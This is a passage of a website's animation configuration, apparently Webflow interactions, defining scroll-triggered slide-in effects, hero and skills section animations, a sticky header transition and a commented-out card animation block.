          id: "6180f175feada501f31bcc4d|838ca649-5a33-0d07-05eb-44f6ba259c32",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814286937,
      },
      "e-108": {
        id: "e-108",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-109" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|838ca649-5a33-0d07-05eb-44f6ba259c3b",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814286937,
      },
      "e-110": {
        id: "e-110",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-111" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|838ca649-5a33-0d07-05eb-44f6ba259c44",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814286937,
      },
      "e-112": {
        id: "e-112",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-113" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|838ca649-5a33-0d07-05eb-44f6ba259c4e",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814286937,
      },
      "e-114": {
        id: "e-114",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-115" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|e48cf2dd-7fbe-629c-2b2a-c5f0e6084575",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814288449,
      },
      "e-116": {
        id: "e-116",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-117" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|e48cf2dd-7fbe-629c-2b2a-c5f0e608457e",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814288449,
      },
      "e-118": {
        id: "e-118",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-119" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|e48cf2dd-7fbe-629c-2b2a-c5f0e6084587",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814288449,
      },
      "e-120": {
        id: "e-120",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-121" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|e48cf2dd-7fbe-629c-2b2a-c5f0e6084591",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814288449,
      },
      "e-122": {
        id: "e-122",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-123" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|fcad5444-12d4-3da2-6c29-be6fc2243a4a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814289745,
      },
      "e-124": {
        id: "e-124",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-125" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|fcad5444-12d4-3da2-6c29-be6fc2243a53",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814289745,
      },
      "e-126": {
        id: "e-126",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-127" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|fcad5444-12d4-3da2-6c29-be6fc2243a5c",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814289745,
      },
      "e-128": {
        id: "e-128",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-129" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|fcad5444-12d4-3da2-6c29-be6fc2243a66",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814289745,
      },
      "e-130": {
        id: "e-130",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-131" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|cb1da624-5ef8-3ed4-28dd-67b2bca1927c",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814291169,
      },
      "e-132": {
        id: "e-132",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-133" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|cb1da624-5ef8-3ed4-28dd-67b2bca19285",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814291169,
      },
      "e-134": {
        id: "e-134",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-135" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|cb1da624-5ef8-3ed4-28dd-67b2bca1928e",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814291169,
      },
      "e-136": {
        id: "e-136",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-137" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|cb1da624-5ef8-3ed4-28dd-67b2bca19298",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1667814291169,
      },
    },
    actionLists: {
      a: {
        id: "a",
        title: "hero-load",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-n",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".header-block.mod--absolute",
                    selectorGuids: [
                      "a15cb4ca-fa31-5a49-c594-9adcc7866054",
                      "438a84de-b10d-69e3-0ef5-03ccb1419d3c",
                    ],
                  },
                  yValue: -60,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-n-6",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".form-block.mod--hero",
                    selectorGuids: [
                      "8ae12ad9-a036-61f0-de68-bff749930473",
                      "517b4b63-c9dc-f492-db6a-92eb93bf7250",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-n-5",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".form-block.mod--hero",
                    selectorGuids: [
                      "8ae12ad9-a036-61f0-de68-bff749930473",
                      "517b4b63-c9dc-f492-db6a-92eb93bf7250",
                    ],
                  },
                  xValue: null,
                  yValue: 100,
                  xUnit: "px",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-n-4",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".hero__h1",
                    selectorGuids: ["41934e9a-623f-bd49-3329-24357b6f120d"],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-n-3",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".hero__h1",
                    selectorGuids: ["41934e9a-623f-bd49-3329-24357b6f120d"],
                  },
                  xValue: null,
                  yValue: 100,
                  xUnit: "px",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-n-2",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".header-block.mod--absolute",
                    selectorGuids: [
                      "a15cb4ca-fa31-5a49-c594-9adcc7866054",
                      "438a84de-b10d-69e3-0ef5-03ccb1419d3c",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-n-11",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".hero__persons",
                    selectorGuids: ["77b3ccde-09dd-d9d6-5b76-94ea8e680420"],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-n-12",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    selector: ".hero__persons",
                    selectorGuids: ["77b3ccde-09dd-d9d6-5b76-94ea8e680420"],
                  },
                  xValue: -300,
                  xUnit: "px",
                  yUnit: "PX",
                  zUnit: "PX",
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-n-32",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 800,
                  target: {
                    selector: ".hero__persons",
                    selectorGuids: ["77b3ccde-09dd-d9d6-5b76-94ea8e680420"],
                  },
                  xValue: 0,
                  xUnit: "px",
                  yUnit: "PX",
                  zUnit: "PX",
                },
              },
              {
                id: "a-n-31",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__persons",
                    selectorGuids: ["77b3ccde-09dd-d9d6-5b76-94ea8e680420"],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-n-14",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 200,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__h1",
                    selectorGuids: ["41934e9a-623f-bd49-3329-24357b6f120d"],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-n-15",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 200,
                  easing: "ease",
                  duration: 800,
                  target: {
                    selector: ".hero__h1",
                    selectorGuids: ["41934e9a-623f-bd49-3329-24357b6f120d"],
                  },
                  xValue: null,
                  yValue: 0,
                  xUnit: "px",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-n-18",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 300,
                  easing: "ease",
                  duration: 800,
                  target: {
                    selector: ".form-block.mod--hero",
                    selectorGuids: [
                      "8ae12ad9-a036-61f0-de68-bff749930473",
                      "517b4b63-c9dc-f492-db6a-92eb93bf7250",
                    ],
                  },
                  xValue: null,
                  yValue: 0,
                  xUnit: "px",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-n-17",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 300,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".form-block.mod--hero",
                    selectorGuids: [
                      "8ae12ad9-a036-61f0-de68-bff749930473",
                      "517b4b63-c9dc-f492-db6a-92eb93bf7250",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-n-34",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 500,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".header-block.mod--absolute",
                    selectorGuids: [
                      "a15cb4ca-fa31-5a49-c594-9adcc7866054",
                      "438a84de-b10d-69e3-0ef5-03ccb1419d3c",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-n-33",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 500,
                  easing: "ease",
                  duration: 800,
                  target: {
                    selector: ".header-block.mod--absolute",
                    selectorGuids: [
                      "a15cb4ca-fa31-5a49-c594-9adcc7866054",
                      "438a84de-b10d-69e3-0ef5-03ccb1419d3c",
                    ],
                  },
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !0,
        createdOn: 1635844364933,
      },
      "a-2": {
        id: "a-2",
        title: "skills-scroll",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-2-n-11",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    id: "6180f175feada501f31bcc4d|53a1ed10-496b-4987-f1af-8ccaa751b1a0",
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-2-n-10",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    id: "6180f175feada501f31bcc4d|53a1ed10-496b-4987-f1af-8ccaa751b1a0",
                  },
                  yValue: 30,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-12",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|a2cca053-20e0-c96d-c2d3-0126d5320768",
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-2-n-13",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|a2cca053-20e0-c96d-c2d3-0126d5320768",
                  },
                  yValue: 30,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-14",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|9a373b1c-d2c4-ffec-bc63-6423f6705f31",
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-2-n-15",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|9a373b1c-d2c4-ffec-bc63-6423f6705f31",
                  },
                  yValue: 30,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-22",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    selector: ".skills__video-wrap",
                    selectorGuids: ["9c42df90-07c1-bf18-2a9f-54b1df36beca"],
                  },
                  xValue: null,
                  yValue: 100,
                  xUnit: "px",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-24",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    selector: ".skills__video-wrap",
                    selectorGuids: ["9c42df90-07c1-bf18-2a9f-54b1df36beca"],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-2-n-8",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "",
                  duration: 0,
                  target: {
                    selector: ".skills__achieve",
                    selectorGuids: ["30e7c37e-de38-4ba0-e82e-037fe2845148"],
                  },
                  heightValue: 0,
                  widthUnit: "PX",
                  heightUnit: "px",
                  locked: !1,
                },
              },
            ],
          },
          {
            actionItems: [
              {
                id: "a-2-n-16",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    id: "6180f175feada501f31bcc4d|53a1ed10-496b-4987-f1af-8ccaa751b1a0",
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-2-n-17",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    id: "6180f175feada501f31bcc4d|53a1ed10-496b-4987-f1af-8ccaa751b1a0",
                  },
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-25",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 800,
                  target: {
                    useEventTarget: "CHILDREN",
                    selector: ".skills__video-wrap",
                    selectorGuids: ["9c42df90-07c1-bf18-2a9f-54b1df36beca"],
                  },
                  xValue: null,
                  yValue: 0,
                  xUnit: "px",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-26",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    selector: ".skills__video-wrap",
                    selectorGuids: ["9c42df90-07c1-bf18-2a9f-54b1df36beca"],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-2-n-19",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 200,
                  easing: "ease",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|a2cca053-20e0-c96d-c2d3-0126d5320768",
                  },
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-18",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 200,
                  easing: "ease",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|a2cca053-20e0-c96d-c2d3-0126d5320768",
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-2-n-20",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 400,
                  easing: "ease",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|9a373b1c-d2c4-ffec-bc63-6423f6705f31",
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-2-n-21",
                actionTypeId: "TRANSFORM_MOVE",
                config: {
                  delay: 400,
                  easing: "ease",
                  duration: 500,
                  target: {
                    useEventTarget: "CHILDREN",
                    id: "6180f175feada501f31bcc4d|9a373b1c-d2c4-ffec-bc63-6423f6705f31",
                  },
                  yValue: 0,
                  xUnit: "PX",
                  yUnit: "px",
                  zUnit: "PX",
                },
              },
              {
                id: "a-2-n-9",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 500,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".skills__achieve",
                    selectorGuids: ["30e7c37e-de38-4ba0-e82e-037fe2845148"],
                  },
                  widthUnit: "PX",
                  heightUnit: "AUTO",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !0,
        createdOn: 1635848395310,
      },
      "a-3": {
        id: "a-3",
        title: "header",
        continuousParameterGroups: [
          {
            id: "a-3-p",
            type: "SCROLL_PROGRESS",
            parameterLabel: "Scroll",
            continuousActionGroups: [
              {
                keyframe: 45,
                actionItems: [
                  {
                    id: "a-3-n-3",
                    actionTypeId: "TRANSFORM_MOVE",
                    config: {
                      delay: 0,
                      easing: "ease",
                      duration: 500,
                      target: {
                        selector: ".header-block.mod--fixed",
                        selectorGuids: [
                          "a15cb4ca-fa31-5a49-c594-9adcc7866054",
                          "8bd739fb-1b07-cfcc-028a-f68b20535523",
                        ],
                      },
                      yValue: -100,
                      xUnit: "PX",
                      yUnit: "px",
                      zUnit: "PX",
                    },
                  },
                ],
              },
              {
                keyframe: 45.01,
                actionItems: [
                  {
                    id: "a-3-n-2",
                    actionTypeId: "TRANSFORM_MOVE",
                    config: {
                      delay: 0,
                      easing: "ease",
                      duration: 500,
                      target: {
                        selector: ".header-block.mod--fixed",
                        selectorGuids: [
                          "a15cb4ca-fa31-5a49-c594-9adcc7866054",
                          "8bd739fb-1b07-cfcc-028a-f68b20535523",
                        ],
                      },
                      yValue: 0,
                      xUnit: "PX",
                      yUnit: "px",
                      zUnit: "PX",
                    },
                  },
                ],
              },
            ],
          },
        ],
        createdOn: 1635878348304,
      },




      // "a-4": {
      //   id: "a-4",
      //   title: "card 3",
      //   actionItemGroups: [
      //     {
      //       actionItems: [
    
    
      //         {
      //           id: "a-4-n",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person.mod--4",
      //               selectorGuids: [
      //                 "937b4a30-5db7-d9b4-8412-213b3e33edef",
      //                 "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
      //               ],
      //             },
      //             widthValue: 21,
      //             widthUnit: "%",
      //             heightUnit: "PX",
      //             locked: !1,
      //           },
      //         },
    
    
    
    
    
    
    
    
      //         {
      //           id: "a-4-n",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person.mod--2",
      //               selectorGuids: [
      //                 "937b4a30-5db7-d9b4-8412-213b3e33edef",
      //                 "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
      //               ],
      //             },
      //             widthValue: 21,
      //             widthUnit: "%",
      //             heightUnit: "PX",
      //             locked: !1,
      //           },
      //         },
      //         {
      //           id: "a-4-n-12",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person-img.mod--1",
      //               selectorGuids: [
      //                 "e514cb96-ca68-e414-1212-96ee69ec1bae",
      //                 "36648068-e0c7-a091-11cd-21efa1e922cd",
      //               ],
      //             },
      //             heightValue: 100,
      //             widthUnit: "PX",
      //             heightUnit: "%",
      //             locked: !1,
      //           },
      //         },
      //         {
      //           id: "a-4-n-11",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person-img.mod--2",
      //               selectorGuids: [
      //                 "e514cb96-ca68-e414-1212-96ee69ec1bae",
      //                 "fd64154a-e0dd-9461-f424-47c91112c834",
      //               ],
      //             },
      //             heightValue: 100,
      //             widthUnit: "PX",
      //             heightUnit: "%",
      //             locked: !1,
      //           },
      //         },
    
    
    
    
    
    
      //         {
      //           id: "a-4-n-11",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person-img.mod--4",
      //               selectorGuids: [
      //                 "e514cb96-ca68-e414-1212-96ee69ec1bae",
      //                 "fd64154a-e0dd-9461-f424-47c91112c834",
      //               ],
      //             },
      //             heightValue: 100,
      //             widthUnit: "PX",
      //             heightUnit: "%",
      //             locked: !1,
      //           },
      //         },
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
      //         {
      //           id: "a-4-n-10",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person-img.mod--3",
      //               selectorGuids: [
      //                 "e514cb96-ca68-e414-1212-96ee69ec1bae",
      //                 "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
      //               ],
      //             },
      //             heightValue: 115,
      //             widthUnit: "PX",
      //             heightUnit: "%",
      //             locked: !1,
      //           },
      //         },
      //         {
      //           id: "a-4-n-2",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-more.mod--3",
      //               selectorGuids: [
      //                 "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
      //                 "013700ce-17bf-936e-69b1-06f8c72ec5dd",
      //               ],
      //             },
      //             value: 1,
      //             unit: "",
      //           },
      //         },
      //         {
      //           id: "a-4-n-3",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-less.mod--3",
      //               selectorGuids: [
      //                 "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
      //                 "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
      //               ],
      //             },
      //             value: 0,
      //             unit: "",
      //           },
      //         },
      //         {
      //           id: "a-4-n-4",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-more.mod--2",
      //               selectorGuids: [
      //                 "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
      //                 "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
      //               ],
      //             },
      //             value: 0,
      //             unit: "",
      //           },
      //         },
    
    
    
    
    
    
    
      //         {
      //           id: "a-4-n-4",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
